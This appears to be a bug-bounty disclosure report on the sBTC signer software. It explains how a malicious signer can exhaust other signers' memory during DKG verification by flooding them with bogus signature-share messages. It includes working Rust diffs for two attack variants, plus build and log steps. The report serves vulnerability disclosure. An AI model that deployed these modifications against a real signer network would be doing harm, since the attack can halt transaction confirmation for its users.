# #42404 \[BC-Medium] A signer can OOM kill other signers during DKG verification

**Submitted on Mar 23rd 2025 at 17:26:26 UTC by @Blobism for** [**Attackathon | Stacks II**](https://immunefi.com/audit-competition/stacks-attackathon-2)

* **Report ID:** #42404
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_1.0>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

The DKG verification state machine stores WSTS messages in Vecs of queued messages, but does not discard these messages after they have been processed. Signers can exploit this during DKG verification by holding up the verification process and filling the queued message Vecs of other signers with bogus messages. This can lead to an out of memory (OOM) kill of any signer by a malcious signer during the DKG verification process, shutting down the network.

## Vulnerability Details

The main vulnerability lies in `signer/src/dkg/verification.rs`. In the function `process_queued_messages`, rather than removing old messages from the `wsts_messages` HashMap that have been processed, they simply get marked as processed and remain in their current Vec:

```rust
// Process all of the messages that we determined could be processed.
for msg in messages {
    // Mark the message as processed so that even if it fails we don't
    // try to process it again.
    msg.mark_processed();

    // ...

}
```

There are numerous ways that a signer can hold up the DKG verification process in order to flood other signers with bogus messages and OOM kill them. A couple of these methods are shown in the PoC. The approaches shown in the PoC are:

* If the signer is a coordinator, they can withhold the SignatureShareRequest and instead spam other signers with bogus SignatureShareResponse messages
* If the signer is not a coordinator, they can withhold their NonceResponse and instead spam other signers with bogus SignatureShareResponse messages

The malicious signer simply needs to fill the Vecs of other signers to the point of OOM killing them, before the DKG verification round times out. Additionally, they can have multiple chances at this since many DKG verification state machines can be present in memory (in `signer/src/transaction_signer.rs`), allowing plenty of time to OOM kill signers:

```
pub dkg_verification_state_machines: LruCache<StateMachineId, dkg::verification::StateMachine>,
```

## Impact Details

Because a single signer is capable of OOM killing any other signer during the DKG verification process, the malicious signer can shut down the network. I classify this as "Network not being able to confirm new transactions (total network shutdown)"

## References

<https://github.com/stacks-network/sbtc/blob/immunefi\\_attackaton\\_1.0/signer/src/dkg/verification.rs>

Commit on branch: <https://github.com/stacks-network/sbtc/commit/79e0caf06f079cee08831fdc13d21de5459170b9>

## Proof of Concept

First add the following printing to show that the exploited Vec length is growing in the logs:

```diff
diff --git a/signer/src/dkg/verification.rs b/signer/src/dkg/verification.rs
index 0254c80a..40334c6d 100644
--- a/signer/src/dkg/verification.rs
+++ b/signer/src/dkg/verification.rs
@@ -333,6 +333,7 @@ impl StateMachine {
     /// in the correct state.
     fn enqueue_message(&mut self, msg: wsts::net::Message) -> Result<(), Error> {
         let msg_type: WstsNetMessageType = (&msg).into();
+        tracing::info!("enqueue_message current length: {}", self.wsts_messages.entry(msg_type).or_default().len());
 
         // Enqueue the message under its message type.
         self.wsts_messages
```

Now, apply the modifications of each approach separately below, then do the following after applying each modification:

```
make devenv-down
make build
docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build
make devenv-up
```

## Approach 1: Coordinator

For this example just assume that the first coordinator is the malicious one (the subsequent coordinators will act maliciously too, but we only need to see it happen once). In this approach, the coordinator holds up DKG verification by withholding the SignatureShareRequest, instead spamming the signers with large SignatureShareResponse messages.

```diff
diff --git a/signer/src/transaction_coordinator.rs b/signer/src/transaction_coordinator.rs
index 826eecc2..1959c7e4 100644
--- a/signer/src/transaction_coordinator.rs
+++ b/signer/src/transaction_coordinator.rs
@@ -1713,8 +1713,43 @@ where
             };
 
             if let Some(packet) = outbound_packet {
-                let msg = message::WstsMessage { id, inner: packet.msg };
-                self.send_message(msg, bitcoin_chain_tip).await?;
+                if let wsts::net::Message::SignatureShareRequest(msg) = packet.msg.clone() {
+                    for i in 0..100 {
+                        let mut my_id = 9999;
+
+                        let public_key_point = p256k1::point::Point::from(self.signer_public_key());
+
+                        for (key, val) in &coordinator.get_config().signer_public_keys {
+                            if *val == public_key_point {
+                                my_id = *key;
+                                break;
+                            }
+                        }
+
+                        let mut signature_shares = Vec::new();
+
+                        for j in 0..100 {
+                            signature_shares.push(wsts::common::SignatureShare {
+                                id: i * 100 + j,
+                                z_i: Default::default(),
+                                key_ids: Vec::new(),
+                            });
+                        }
+
+                        let msg = message::WstsMessage { id, inner: wsts::net::Message::SignatureShareResponse(wsts::net::SignatureShareResponse {
+                            dkg_id: msg.dkg_id,
+                            sign_id: msg.sign_id,
+                            sign_iter_id: msg.sign_iter_id,
+                            signer_id: my_id,
+                            signature_shares: signature_shares,
+                        }) };
+                        self.send_message(msg, bitcoin_chain_tip).await?;
+                    }
+                } else {
+                    // everything else operates as normal
+                    let msg = message::WstsMessage { id, inner: packet.msg };
+                    self.send_message(msg, bitcoin_chain_tip).await?;
+                }
             }
 
             match operation_result {
```

## Approach 2: Any Signer

In this approach, any signer can hold up the DKG verification process by withholding their NonceResponse message, then once again spamming all signers with bogus SignatureShareResponse messages. In this case, `signer_id == 2` is assigned as the malicious signer.

```diff
diff --git a/signer/src/transaction_signer.rs b/signer/src/transaction_signer.rs
index 60b2772c..e22a919c 100644
--- a/signer/src/transaction_signer.rs
+++ b/signer/src/transaction_signer.rs
@@ -1474,9 +1480,42 @@ where
                 self.wsts_state_machines.pop(state_machine_id);
             }
 
-            // Publish the message to the network.
-            let msg = message::WstsMessage { id: wsts_id, inner: outbound };
-            self.send_message(msg, bitcoin_chain_tip).await?;
+            let mut attack = false;
+            if let WstsNetMessage::NonceResponse(msg) = outbound.clone() {
+                // this is sbtc-signer-1 typically
+                if msg.signer_id == 2 {
+                    attack = true;
+                    tracing::info!("Sending SignatureShareResponse attack");
+
+                    for i in 0..100 {
+                        let mut signature_shares = Vec::new();
+
+                        for j in 0..100 {
+                            signature_shares.push(wsts::common::SignatureShare {
+                                id: i * 100 + j,
+                                z_i: Default::default(),
+                                key_ids: Vec::new(),
+                            });
+                        }
+
+                        let msg = message::WstsMessage { id: wsts_id, inner: wsts::net::Message::SignatureShareResponse(wsts::net::SignatureShareResponse {
+                            dkg_id: msg.dkg_id,
+                            sign_id: msg.sign_id,
+                            sign_iter_id: msg.sign_iter_id,
+                            signer_id: msg.signer_id,
+                            signature_shares: signature_shares,
+                        }) };
+                        self.send_message(msg, bitcoin_chain_tip).await?;
+                    }
+                }
+            }
+
+            // everything else operates as normal
+            if !attack {
+                // Publish the message to the network.
+                let msg = message::WstsMessage { id: wsts_id, inner: outbound };
+                self.send_message(msg, bitcoin_chain_tip).await?;
+            }
         }
 
         Ok(())
```

## Expected Results

Look at the logs of signer 3, for example:

```
docker logs sbtc-signer-3
```

With both approaches, a message similar to this should appear in the logs for the signers:

```
enqueue_message current length: 99
```

The attack PoC is limited to just 100 messages here, but more could be sent to cause an OOM kill.
